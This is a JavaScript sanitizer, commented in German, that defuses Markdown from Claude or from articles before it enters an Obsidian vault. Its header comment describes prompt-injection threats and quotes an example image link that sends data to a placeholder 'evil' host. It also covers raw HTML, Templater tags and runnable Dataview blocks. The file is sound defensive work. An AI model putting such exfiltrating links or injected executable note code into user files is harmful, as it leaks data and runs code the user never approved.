/**
 * Markdown von Claude (oder aus einem Artikel) entschärfen, bevor es in den
 * Vault geht. Ein Text kann per Prompt-Injection Dinge einschleusen, die
 * Obsidian beim Öffnen ausführt oder lädt:
 *
 * - Bilder von fremden Servern (`![](https://evil/?d=…)`) verraten beim Anzeigen,
 *   was in der Adresse steht → normaler Link `[alt](url)`.
 * - Rohes HTML (`<img>`, `<iframe>`, `<script>`) → `<` als `&lt;` außerhalb von Code;
 *   Autolinks `<https://…>` bleiben.
 * - Templater (`<% … %>`) läuft bei „Trigger on new file creation“ auch in Code
 *   und Frontmatter → ein unsichtbares Zeichen trennt `<` und `%`
 *   (`breakTemplater` für Frontmatter-Werte).
 * - Code-Blöcke, die Plugins ausführen (`dataviewjs`, `dataview`, `query`, `tasks`)
 *   → Sprache `text`; Dataview-Inline-Abfragen (`` `= …` ``, `` `$= …` ``) → ein
 *   unsichtbares Zeichen davor.
 *
 * Wikilinks, Überschriften, Listen und `%%`-Kommentare bleiben. Mehrfach
 * angewandt ändert sich nichts mehr.
 */

const ZW = '​';
// Erste Zeile eines Code-Blocks, auch in Zitaten, Callouts und Listen.
const FENCE = /^([ \t>]*(?:[-*+][ \t]+|\d+[.)][ \t]+)?[ \t>]*)(`{3,}|~{3,})(.*)$/;
const RUNNABLE = /^(dataviewjs|dataview|query|tasks)(?=\s|$)/i;

/** `<%` trennen: Templater findet es überall, auch in Code und Frontmatter. */
export const breakTemplater = (s) => String(s ?? '').replace(/<%/g, `<${ZW}%`);

/** Fließtext einer Zeile (ohne Code): Bilder, HTML, Templater. */
function text(s) {
  return s
    .replace(/!\[(?!\[)/g, '[')
    .replace(/<(?!https?:\/\/[^\s<>]+>)/gi, '&lt;');
}

/** Eine Zeile außerhalb von Code-Blöcken; Inline-Code bleibt, wie er ist, bis auf Templater und Dataview. */
function line(s) {
  let out = '';
  let rest = s;
  for (;;) {
    const open = /`+/.exec(rest);
    if (!open) return out + text(rest);
    const close = rest.indexOf(open[0], open.index + open[0].length);
    // Ohne passenden Zaun ist der Backtick Text.
    if (close < 0 || rest.slice(open.index + open[0].length, close).includes('`'.repeat(open[0].length + 1))) {
      out += text(rest.slice(0, open.index + open[0].length));
      rest = rest.slice(open.index + open[0].length);
      continue;
    }
    let code = breakTemplater(rest.slice(open.index + open[0].length, close));
    if (/^\s*\$?=/.test(code)) code = `${ZW}${code}`;
    out += `${text(rest.slice(0, open.index))}${open[0]}${code}${open[0]}`;
    rest = rest.slice(close + open[0].length);
  }
}

/** Markdown fürs Wiki entschärfen (siehe oben). */
export function safeWikiMarkdown(md) {
  const lines = String(md ?? '').split('\n');
  let fence = null;
  return lines
    .map((l) => {
      const f = FENCE.exec(l);
      if (fence) {
        if (f && f[2][0] === fence[0] && f[2].length >= fence.length && !f[3].trim()) fence = null;
        return breakTemplater(l);
      }
      if (f && !(f[2][0] === '`' && f[3].includes('`'))) {
        fence = f[2];
        return breakTemplater(`${f[1]}${f[2]}${f[3].replace(/^(\s*)(\S+)/, (m, sp, lang) => (RUNNABLE.test(lang) ? `${sp}text` : m))}`);
      }
      return line(l);
    })
    .join('\n');
}
